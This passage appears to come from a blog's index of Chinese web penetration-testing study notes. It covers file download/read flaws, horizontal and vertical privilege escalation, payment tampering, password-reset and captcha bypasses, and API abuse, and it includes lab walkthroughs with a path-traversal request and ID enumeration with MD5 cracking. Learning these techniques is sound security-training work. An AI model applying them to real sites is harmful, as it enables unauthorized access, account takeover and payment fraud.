<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>固定后缀：include($filename.”.html”);</p>
<p>固定文件：include(“1.php”);</p>
<p>WAF产品</p>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="https://pan.baidu.com/share/init?surl=x_mwVF--xxmoKAvDJ8mRsw">php文件包含漏洞源码</a>    提取码：xiao</p>
]]></content>
      <categories>
        <category>小迪安全-Web渗透测试笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>文件包含</tag>
        <tag>文件操作</tag>
      </tags>
  </entry>
  <entry>
    <title>文件下载读取</title>
    <url>/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/</url>
    <content><![CDATA[<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%AE%89%E5%85%A8.png" alt="文件操作安全"></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>显示源代码，则为文件读取漏洞</p>
<p>提示文件下载，则为文件下载漏洞</p>
<p>文件被解析成脚本语言，则为文件包含漏洞</p>
<span id="more"></span>

<h2 id="漏洞检测点"><a href="#漏洞检测点" class="headerlink" title="漏洞检测点"></a>漏洞检测点</h2><h3 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h3><p>read.xxx?filename=</p>
<p>down.xxx?filename=</p>
<h3 id="参数值"><a href="#参数值" class="headerlink" title="参数值"></a>参数值</h3><p>&amp;readpath=    &amp;filepath=    &amp;path=    &amp;inputfile=    &amp;url=    &amp;data=    &amp;readfile=    &amp;menu=    META-INF=    WEB-INF</p>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>参数值有的会用加密算法进行<strong>加密</strong>，所以在下载想要的文件，需要对该文件路径进行加密</p>
<h3 id="目录符号"><a href="#目录符号" class="headerlink" title="目录符号"></a>目录符号</h3><p><code>../</code>    <code>..\</code>    <code>./</code>    <code>.\</code>等</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h2 id="常见文件"><a href="#常见文件" class="headerlink" title="常见文件"></a>常见文件</h2><p>后台首页日志等可见文件</p>
<h3 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h3><p>数据库配置文件下载或读取及后续</p>
<p>接口密匙信息文件下载或读取及后续</p>
<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="pikachu任意文件下载"><a href="#pikachu任意文件下载" class="headerlink" title="pikachu任意文件下载"></a>pikachu任意文件下载</h3><p>访问靶场后查看右键复制图片地址进行查看</p>
<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/pikachu%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-wp1.png" alt="pikachu任意文件下载-wp1"></p>
<p>得到图片地址为<code>http://127.0.0.1:8080/pikachu/vul/unsafedownload/download/ai.png</code></p>
<p>右键复制查看下载地址</p>
<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/pikachu%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-wp1.png" alt="pikachu任意文件下载-wp1"></p>
<p>得到下载地址为<code>http://127.0.0.1:8080/pikachu/vul/unsafedownload/execdownload.php?filename=ai.png</code></p>
<p>现在我们通过漏洞下载<code>execdownload.php</code>文件，查看其源代码，但由于<code>execdownload.php</code>文件在<code>ai.png</code>的上一级目录，所以我们构造的攻击语句为</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/pikachu/vul/unsafedownload/execdownload.php?filename=../execdownload.php</span><br></pre></td></tr></table></figure>

<p>得到源码，得到下载漏洞目录是<code>download/</code></p>
<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/pikachu%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-wp3.png" alt="pikachu任意文件下载-wp3"></p>
<p>接下来我们通过该漏洞去下载<strong>敏感文件</strong>或<strong>配置文件</strong></p>
<p>但一般这些文件需要知道绝对路径，我们可以使用扫描器去扫，用大一点的字典去跑</p>
<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a><a href="https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java">[RoarCTF 2019]Easy Java</a></h3><p>Java开发的项目文件下载一般用POST传参</p>
<p>此题读取WEB配置文件WEB-INF/web.xml</p>
<p><a href="https://blog.csdn.net/ChenZIDu/article/details/103533554">https://blog.csdn.net/ChenZIDu/article/details/103533554</a></p>
<p><a href="https://blog.csdn.net/silencediors/article/details/102579567">https://blog.csdn.net/silencediors/article/details/102579567</a></p>
<h3 id="“百度杯”CTF比赛-2017-二月场-Zone"><a href="#“百度杯”CTF比赛-2017-二月场-Zone" class="headerlink" title="“百度杯”CTF比赛 2017 二月场-Zone"></a><a href="https://www.ichunqiu.com/battalion?t=1&r=57475">“百度杯”CTF比赛 2017 二月场-Zone</a></h3><p><a href="https://www.ichunqiu.com/writeup/detail/4941">https://www.ichunqiu.com/writeup/detail/4941</a></p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="小米路由器远程任意文件读取漏洞"><a href="#小米路由器远程任意文件读取漏洞" class="headerlink" title="小米路由器远程任意文件读取漏洞"></a><a href="https://www.seebug.org/vuldb/ssvid-98122">小米路由器远程任意文件读取漏洞</a></h3><h2 id="Java文件下载"><a href="#Java文件下载" class="headerlink" title="Java文件下载"></a>Java文件下载</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></p>
<h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>mvc框架：model view controller</p>
<p><a href="http://www.baidu.com/link?url=UA_cyTHHSeD2kK_DpzJiSGieQvPpY5mbLBFq_VFEUXTcAOW-Epp3yUjbjrAAWdyD_DrfySzJdTu7haN3brxyUa&wd=&eqid=a8af765e000244620000000661330346"><em>MVC 模式</em> | 菜鸟教程</a></p>
]]></content>
      <categories>
        <category>小迪安全-Web渗透测试笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>文件操作</tag>
        <tag>文件下载</tag>
        <tag>文件读取</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑越权</title>
    <url>/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83.png" alt="逻辑越权"></p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E.png" alt="逻辑漏洞"></p>
<span id="more"></span>

<h2 id="水平垂直越权"><a href="#水平垂直越权" class="headerlink" title="水平垂直越权"></a>水平垂直越权</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83.png" alt="水平垂直越权"></p>
<h4 id="水平"><a href="#水平" class="headerlink" title="水平"></a>水平</h4><p>通过更换某个ID之类的身份标识，从而使A账号获取（修改、删除等）B账号数据。（AB同级）</p>
<h4 id="垂直"><a href="#垂直" class="headerlink" title="垂直"></a>垂直</h4><p>使用<strong>低权限</strong>身份的账号，<strong>发送高权</strong>限账号才能有的<strong>请求</strong>，获得其高权限的操作。</p>
<h4 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a>未授权</h4><p>通过<strong>删除请求中的认证信息</strong>后重放该请求，依旧可以访问或者完成操作。（无需账户登录）</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="前端安全造成：界面"><a href="#前端安全造成：界面" class="headerlink" title="前端安全造成：界面"></a>前端安全造成：界面</h4><p>判断用户等级后，前端代码界面部分进行可选显示</p>
<p>有的页面不显示，不代表不存在，只是权限不够</p>
<p>漏洞点在只是没有显示，但是没有限制身份的访问</p>
<h4 id="后端安全造成：数据库"><a href="#后端安全造成：数据库" class="headerlink" title="后端安全造成：数据库"></a>后端安全造成：数据库</h4><p>如果在访问网站数据包中有传输用户的编号、用户所属组编号或类型编号时，就可以尝试对这类值进行修改，这也是最基本的越权漏洞测试</p>
<p>例如：</p>
<table>
<thead>
<tr>
<th>id</th>
<th>username</th>
<th>password</th>
<th>usertype</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>admin</td>
<td>123456</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>1ceC0la</td>
<td>654321</td>
<td>0</td>
</tr>
</tbody></table>
<p>当登陆时，会调用数据库判断admin和1ceC0la的权限，即此处的usertype的值</p>
<h3 id="修复防御方案"><a href="#修复防御方案" class="headerlink" title="修复防御方案"></a>修复防御方案</h3><p>1.前后端同时对用户输入信息进行校验，双重验证机制</p>
<p>2.调用功能前验证用户是否有权限调用相关功能</p>
<p>3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限</p>
<p>4.直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理</p>
<p>5.永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</p>
<h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><h4 id="Pikachu-本地水平垂直越权"><a href="#Pikachu-本地水平垂直越权" class="headerlink" title="Pikachu-本地水平垂直越权"></a>Pikachu-本地水平垂直越权</h4><p><a href="https://blog.csdn.net/weixin_50699777/article/details/116047307">https://blog.csdn.net/weixin_50699777/article/details/116047307</a></p>
<h4 id="墨者学院-身份认证失效漏洞实战"><a href="#墨者学院-身份认证失效漏洞实战" class="headerlink" title="墨者学院-身份认证失效漏洞实战"></a><a href="https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe">墨者学院-身份认证失效漏洞实战</a></h4><h5 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h5><p>访问靶场所在地址后</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp1.png" alt="身份认证失效漏洞实战-wp1"></p>
<p>登录所给的test账户</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp2.png" alt="身份认证失效漏洞实战-wp2"></p>
<p>打开burp刷新页面抓包，发现一个有id的包</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp3.png" alt="身份认证失效漏洞实战-wp3"></p>
<p>发到<code>Repeater</code>发包看响应的内容，有用户名，和经过加密的密码</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp4.png" alt="身份认证失效漏洞实战-wp4"></p>
<p>此处密码有32位，应该是md5加密</p>
<p>网上搜索md5解密，来解密这段密文</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp5.png" alt="身份认证失效漏洞实战-wp5"></p>
<p>结果确实是test，故这是用md5来加密的</p>
<p>之后改id值继续发包，把末位的22改成21</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp6.png" alt="身份认证失效漏洞实战-wp6"></p>
<p>有响应数据，说明存在越权漏洞，因为看到了不属于当前用户的信息</p>
<p>于是将数据报发到<code>Intruder</code>爆破存在的id账户信息</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp7.png" alt="身份认证失效漏洞实战-wp7"></p>
<p>题目是让我们找到马春生的信息，故需要登录马春生的账户</p>
<p>这里需要找到马春生的用户名，注意到首页登陆页面马春生的头像</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp8.png" alt="身份认证失效漏洞实战-wp8"></p>
<p>右键在新标签页中打开图片</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp9.png" alt="身份认证失效漏洞实战-wp9"></p>
<p>发现图片名命和之前发现的id类似，于是就去对比，发现是匹配的</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp10.png" alt="身份认证失效漏洞实战-wp10"></p>
<p>于是解密加密数据进行登录</p>
<p>用户名：m233241</p>
<p>password解密结果：9732343</p>
<p>登陆成功，得到key</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp11.png" alt="身份认证失效漏洞实战-wp11"></p>
<h3 id="越权检测工具"><a href="#越权检测工具" class="headerlink" title="越权检测工具"></a>越权检测工具</h3><h4 id="小米范"><a href="#小米范" class="headerlink" title="小米范"></a>小米范</h4><p><a href="https://www.cnblogs.com/fsqsec/p/5697517.html">https://www.cnblogs.com/fsqsec/p/5697517.html</a></p>
<h4 id="Burpsuite插件Authz"><a href="#Burpsuite插件Authz" class="headerlink" title="Burpsuite插件Authz"></a>Burpsuite插件Authz</h4><p><a href="https://www.cnblogs.com/MiWhite/p/7020520.html">https://www.cnblogs.com/MiWhite/p/7020520.html</a></p>
<h4 id="中通安全开源项目之越权漏洞自动化检测"><a href="#中通安全开源项目之越权漏洞自动化检测" class="headerlink" title="中通安全开源项目之越权漏洞自动化检测"></a><a href="https://github.com/ztosec/secscan-authcheck">中通安全开源项目之越权漏洞自动化检测</a></h4><p><a href="https://www.cnblogs.com/starrys/p/13935730.html">https://www.cnblogs.com/starrys/p/13935730.html</a></p>
<h2 id="登陆脆弱及支付篡改"><a href="#登陆脆弱及支付篡改" class="headerlink" title="登陆脆弱及支付篡改"></a>登陆脆弱及支付篡改</h2><h3 id="登陆应用功能点安全问题"><a href="#登陆应用功能点安全问题" class="headerlink" title="登陆应用功能点安全问题"></a>登陆应用功能点安全问题</h3><p>HTTP/HTTPS协议进行密码抓取时，<strong>一般</strong>HTTPS都是加过密的，HTTP直接是明文，也存在HTTP协议也加密了的情况</p>
<p>若有加密数据需要知道采用的什么加密方式才能进行爆破</p>
<h4 id="Cookie脆弱点验证"><a href="#Cookie脆弱点验证" class="headerlink" title="Cookie脆弱点验证"></a>Cookie脆弱点验证</h4><p>黑盒情况：登陆后看Cookie有无可操作的参数</p>
<p>白盒情况：代码审计，看代码逻辑</p>
<h3 id="数据篡改安全问题"><a href="#数据篡改安全问题" class="headerlink" title="数据篡改安全问题"></a>数据篡改安全问题</h3><h4 id="商品购买流程"><a href="#商品购买流程" class="headerlink" title="商品购买流程"></a>商品购买流程</h4><p>选择商品和数量-&gt;选择支付及配送方式-&gt;生成订单编号-&gt;订单支付选择-&gt;完成支付</p>
<h4 id="常见篡改参数"><a href="#常见篡改参数" class="headerlink" title="常见篡改参数"></a>常见篡改参数</h4><p>商品编号ID，购买价格，购买数量，支付方式，订单编号，支付状态等</p>
<h4 id="修改方法"><a href="#修改方法" class="headerlink" title="修改方法"></a>修改方法</h4><p>替换支付</p>
<p>重复支付</p>
<p>最小额支付</p>
<p>负数支付</p>
<p>溢出支付</p>
<p>优惠券支付</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.secpulse.com/archives/67080.html">支付漏洞总结</a></p>
<h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p><a href="https://www.zblogcn.com/zblogphp/">https://www.zblogcn.com/zblogphp/</a></p>
<p><a href="https://github.com/huyuanzhi2/password_brute_dictionary">爆破字典</a></p>
<p><a href="https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg">https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg</a>    提取码：xiao</p>
<h2 id="找回机制及接口安全"><a href="#找回机制及接口安全" class="headerlink" title="找回机制及接口安全"></a>找回机制及接口安全</h2><h3 id="找回重置机制"><a href="#找回重置机制" class="headerlink" title="找回重置机制"></a>找回重置机制</h3><p>1.验证码在客户端回显（在浏览器或数据包中能看到服务端发送的验证码）</p>
<p>phpyun平台绑定手机号码存在客户端数据包回显验证码</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%95%B0%E6%8D%AE%E5%8C%85%E5%9B%9E%E6%98%BE%E9%AA%8C%E8%AF%81%E7%A0%81.png" alt="客户端数据包回显验证码"></p>
<p>2.Response状态值（类似false改成true，通过验证）</p>
<p>phpyun平台绑定手机号码存在修改Response状态值，造成该漏洞的原因是前端代码的验证问题，<strong>主导权在本地</strong>，<strong>不是在服务端校验</strong>，相当于是将服务端的回显值在本地判断后进行验证</p>
<p>我们先看正确的Response和错误的Response</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E6%AD%A3%E7%A1%AE%E7%9A%84Response.png" alt="正确的Response"></p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E9%94%99%E8%AF%AF%E7%9A%84Response.png" alt="错误的Response"></p>
<p>对比发现正确回显为1，错误回显为3</p>
<p>我们只需要将回显值的包用burp抓到，并将错误回显改为正确回显即可</p>
<p>用burp抓包，在Request请求包页面右键，选择<code>Do intercept</code>里面有一项<code>Response to this request</code></p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/burp%E6%8A%93%E5%93%8D%E5%BA%94%E5%8C%85.png" alt="burp抓响应包"></p>
<p>选择后便能抓到服务端的Response回复包</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E5%93%8D%E5%BA%94%E5%8C%85%E5%86%85%E5%AE%B9.png" alt="burp抓响应包"></p>
<p>将3改为1，就能绑定成功</p>
<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E7%BB%91%E5%AE%9A%E6%88%90%E5%8A%9F.png" alt="绑定成功"></p>
<p>3.验证码爆破</p>
<p>4.找回流程中根据数据包的逻辑跳过验证（丢掉验证包）</p>
<p>例如：</p>
<p>流程为：</p>
<ul>
<li>发送验证码</li>
<li>验证</li>
<li>重置密码</li>
</ul>
<p>我们可以丢掉第二个数据包，或者把第二个数据包替换成第三个数据包，达到跳过验证目的</p>
<h4 id="靶场-1"><a href="#靶场-1" class="headerlink" title="靶场"></a>靶场</h4><h5 id="墨者学院-登录密码重置漏洞分析溯源"><a href="#墨者学院-登录密码重置漏洞分析溯源" class="headerlink" title="墨者学院-登录密码重置漏洞分析溯源"></a><a href="https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe">墨者学院-登录密码重置漏洞分析溯源</a></h5><h6 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h6><p><a href="https://blog.csdn.net/weixin_39998158/article/details/100557216">https://blog.csdn.net/weixin_39998158/article/details/100557216</a></p>
<h3 id="接口乱调用"><a href="#接口乱调用" class="headerlink" title="接口乱调用"></a>接口乱调用</h3><p>1.短信空炸</p>
<p>2.来点轰炸</p>
<h3 id="资源-1"><a href="#资源-1" class="headerlink" title="资源"></a>资源</h3><p><a href="https://pan.baidu.com/s/1P73QFmEhY6f350CvmnOJNg">weipan21/phpyun</a></p>
<h2 id="验证码与token及接口"><a href="#验证码与token及接口" class="headerlink" title="验证码与token及接口"></a>验证码与token及接口</h2><p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81.png" alt="安全验证"></p>
<h3 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h3><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>图片，手机或邮箱，语音，视频，操作等</p>
<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>验证生成或验证过程中的逻辑问题</p>
<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>账户权限泄露，短信轰炸，遍历，任意用户操作等</p>
<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><h5 id="验证码复用"><a href="#验证码复用" class="headerlink" title="验证码复用"></a>验证码复用</h5><p><a href="https://blog.csdn.net/qq_41901122/article/details/109451715">https://blog.csdn.net/qq_41901122/article/details/109451715</a></p>
<p>一般是session没有清除导致的</p>
<h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><p>前端：</p>
<p>用浏览器查看是否有与验证码验证相关的代码，若有直接通过抓包发送绕过本地验证即可</p>
<p>后端：一般复用绕过</p>
<h5 id="客户端回显（前文已有）"><a href="#客户端回显（前文已有）" class="headerlink" title="客户端回显（前文已有）"></a>客户端回显（前文已有）</h5><h5 id="爆破（前文已有）"><a href="#爆破（前文已有）" class="headerlink" title="爆破（前文已有）"></a>爆破（前文已有）</h5><h3 id="token安全"><a href="#token安全" class="headerlink" title="token安全"></a>token安全</h3><p>token客户端回显</p>
<p><a href="https://blog.csdn.net/qq_41542761/article/details/102893563">https://blog.csdn.net/qq_41542761/article/details/102893563</a></p>
<h3 id="验证码识别插件工具使用"><a href="#验证码识别插件工具使用" class="headerlink" title="验证码识别插件工具使用"></a>验证码识别插件工具使用</h3><h4 id="captcha-killer-v0-1-2"><a href="#captcha-killer-v0-1-2" class="headerlink" title="captcha-killer v0.1.2"></a><a href="https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2">captcha-killer v0.1.2</a></h4><p><a href="https://www.cnblogs.com/nul1/p/12071115.html">使用burp插件captcha-killer识别图片验证码</a></p>
<h4 id="reCAPTCHA-v1-0"><a href="#reCAPTCHA-v1-0" class="headerlink" title="reCAPTCHA v1.0"></a><a href="https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0">reCAPTCHA v1.0</a></h4><h4 id="Pkav-Http-Fuzz"><a href="#Pkav-Http-Fuzz" class="headerlink" title="Pkav_Http_Fuzz"></a>Pkav_Http_Fuzz</h4><p><a href="https://sec.kim/2019/01/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%EF%BC%9Apkav-http-fuzzer/">https://sec.kim/2019/01/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%EF%BC%9Apkav-http-fuzzer/</a></p>
<h3 id="接口安全问题"><a href="#接口安全问题" class="headerlink" title="接口安全问题"></a>接口安全问题</h3><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>调用，遍历，未授权，篡改</p>
<h4 id="调用案例"><a href="#调用案例" class="headerlink" title="调用案例"></a>调用案例</h4><p>短信轰炸</p>
<h4 id="遍历案例"><a href="#遍历案例" class="headerlink" title="遍历案例"></a>遍历案例</h4><p>UID等便利</p>
<h4 id="参数篡改"><a href="#参数篡改" class="headerlink" title="参数篡改"></a>参数篡改</h4><p>墨者学院靶场</p>
<h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><h5 id="与越权的区别"><a href="#与越权的区别" class="headerlink" title="与越权的区别"></a>与越权的区别</h5><p>Jboss，Jenkins，ldap，Redis，elasticsearch，MenCache，Mongodb，Rsync，Zookeeper，Docker</p>
<h3 id="资源（来源：http-www-xiaodi8-com）"><a href="#资源（来源：http-www-xiaodi8-com）" class="headerlink" title="资源（来源：http://www.xiaodi8.com）"></a>资源（来源：<a href="http://www.xiaodi8.com)/">http://www.xiaodi8.com）</a></h3><p><a href="https://pan.baidu.com/s/1LAhWTmZeSlXGVcGfonFtIQ">未授权访问漏洞集合</a></p>
<p><a href="https://pan.baidu.com/s/1RxFwC_ar7GLY5b4gI9cmmg">web攻防之业务安全实战指南</a></p>
]]></content>
      <categories>
        <category>小迪安全-Web渗透测试笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>逻辑越权</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%8C%96.png" alt="反序化"></p>
<span id="more"></span>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p><img src="/2021/08/25/Web%E6%BC%8F%E6%B4%9E-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="PHP反序列化"></p>
